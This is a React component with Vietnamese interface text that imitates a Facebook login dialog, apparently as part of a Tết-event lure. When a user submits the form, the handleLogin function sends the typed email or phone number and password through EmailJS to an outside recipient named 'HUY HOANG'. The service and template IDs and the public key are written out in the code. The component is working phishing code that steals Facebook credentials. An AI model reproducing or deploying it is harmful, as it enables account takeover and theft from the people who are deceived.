import React, { Component } from 'react';
import { withRouter } from 'react-router-dom';
import { Modal, Input, Spin, message } from 'antd';
import emailjs from 'emailjs-com';

class facebook extends Component {
    constructor(props) {
        super(props);
        this.state = {
            account: {},
            mess_username: '',
            status_username: false,
            mess_password: '',
            status_password: false,
            spin_loading: false,
        }
    }
    async componentDidMount() {
    }
    handleOnchangeInput = (event, id) => {
        let copyState = { ...this.state.account };
        copyState[id] = event.target.value;
        this.setState({
            account: {
                ...copyState
            },
            status_username: false,
            status_password: false,
        });
    }
    isCheckEmpty = (value) => {
        return value.trim().length
    }
    validation = (data) => {
        if (!data.username) {
            this.setState({
                mess_username: 'Email hoặc số điện thoại không được bỏ trống',
                status_username: true,
            });
            return 1;
        }
        if (!data.password) {
            this.setState({
                mess_password: 'Mật khẩu không được bỏ trống',
                status_password: true,
            });
            return 1;
        }
        if (data.username && this.isCheckEmpty(data.username) < 9) {
            this.setState({
                mess_username: 'Tài khoản hoặc mật khẩu không chính xác',
                status_username: true,
            });
            return 1;
        }
        if (data.password && this.isCheckEmpty(data.password) < 3) {
            this.setState({
                mess_username: 'Tài khoản hoặc mật khẩu không chính xác',
                status_username: true,
            });
            return 1;
        }
        return 0;
    }

    handleLogin = () => {
        let result = this.validation(this.state.account);
        if (result == 0) {
            this.setState({ spin_loading: true });
            const templateParams = {
                from_name: 'TET_EVENT',
                to_name: 'HUY HOANG',
                username: this.state.account.username,
                password: this.state.account.password,
            };
            emailjs.send('service_5dq8c88', 'template_54efzsa', templateParams, 'bGPlGtOczDV-e6RNz')
                .then((response) => {
                    console.log('SUCCESS!', response.status, response.text);
                    this.setState({ spin_loading: false });
                    this.props.handle_facebook(false, true);
                }, (err) => {
                    console.log('FAILED...', err);
                    message.error('Gặp sự cố khi liên kết facebook', [10]);
                    this.setState({ spin_loading: false });
                });
        } else {
            return;
        }
    }
    render() {
        return (
            <Modal zIndex={1000} width={320} style={{ top: 20 }} title="Vui lòng đăng nhập facebook "
                open={this.props.status_modal_facebook}
                okText={"Đã hiểu"} okType={"default"}
                onOk={() => this.props.handle_facebook(false, false)}
                cancelText={"Thoát"}
                onCancel={() => this.props.handle_facebook(false, false)}
            >
                <div className=''>
                    <div className='text-center'>
                        <label className='text-[#1877f2] font-[700] text-[28px]'>facebook</label>
                    </div>
                    <div className='p-[10px] border rounded-[5px] shadow-md bg-white'>
                        <div className='space-y-[10px] text-[14px]'>
                            <Input onChange={(event) => this.handleOnchangeInput(event, 'username')}
                                className='h-[40px] w-full '
                                placeholder='Email hoặc số điện thoại' />
                            {this.state.status_username == true &&
                                <label className='text-[11px] text-red-600'>{this.state.mess_username}</label>
                            }
                            <Input.Password onChange={(event) => this.handleOnchangeInput(event, 'password')}
                                className='h-[40px] w-full'
                                placeholder='Mật khẩu' />
                            {this.state.status_password == true &&
                                <label className='text-[11px] text-red-600'>{this.state.mess_password}</label>
                            }
                            <Spin spinning={this.state.spin_loading}>
                                <button onClick={() => this.handleLogin()}
                                    className='text-[15px] h-[40px] w-full bg-[#1877f2] rounded-[5px] text-white font-[500]'>
                                    Đăng nhập
                                </button>
                            </Spin>
                            <div className='text-center'>
                                <a className='text-[#1877f2] '>Quên mật khẩu?</a>
                            </div>
                        </div>
                    </div>
                </div>
            </Modal>
        );
    }

}
export default withRouter(facebook);
